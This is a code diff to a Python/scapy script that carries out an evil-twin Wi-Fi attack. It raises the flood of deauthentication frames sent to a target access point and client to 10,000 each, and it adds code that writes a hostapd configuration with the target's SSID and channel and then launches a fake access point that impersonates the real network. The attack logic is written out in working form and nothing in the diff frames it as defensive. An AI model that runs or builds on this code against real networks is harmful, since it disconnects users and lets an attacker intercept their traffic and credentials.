@@ -1,4 +1,6 @@
 from  scapy.all import *
+from string import Template
+from network import command_line
 from scapy.layers.dot11 import Dot11, RadioTap, Dot11Deauth
 
 
@@ -12,14 +14,16 @@ def deauthentication_packet(interface, net_mac, client_mac):
 
     print('\nsend deauthentication packet...')
 
-    sendp(ap_deauth, count=5000, iface=interface)
-    sendp(cli_deauth, count=5000, iface=interface)
+    sendp(ap_deauth, count=10000, iface=interface)
+    sendp(cli_deauth, count=10000, iface=interface)
 
 
 class Fake:
-    def __init__(self, interface, net_mac, cli_mac):
+    def __init__(self, interface, net_target, cli_mac):
         self.interface = interface
-        self.net_mac = net_mac
+        self.ssid = net_target[0]
+        self.net_mac = net_target[1]
+        self.channel = net_target[2]
         self.cli_mac = cli_mac
         print('\ncreating fake ap')
 
@@ -28,4 +32,19 @@ class Fake:
         self.create_enviroment()
     
     def create_enviroment(self):
-        print('\ncreating necessary files...')
+        """
+        prepare the environment setup for creating the fake access point
+        :param access_point_bssid represent the network name
+        """
+        command_line('rm -rf tempFolder/')
+        command_line('cp -r router tempFolder')
+        with open('tempFolder/hostapd.conf', 'r+') as f:
+            template = Template(f.read())
+            f.seek(0)
+            f.write(template.substitute(INTERFACE=self.interface, 
+                                        SSID=self.ssid,
+                                        CHANNEL=self.channel))
+            f.truncate()
+
+        command_line('hostapd tempFolder/hostapd.conf')
+        # command_line('sudo sh tempFolder/script.sh')
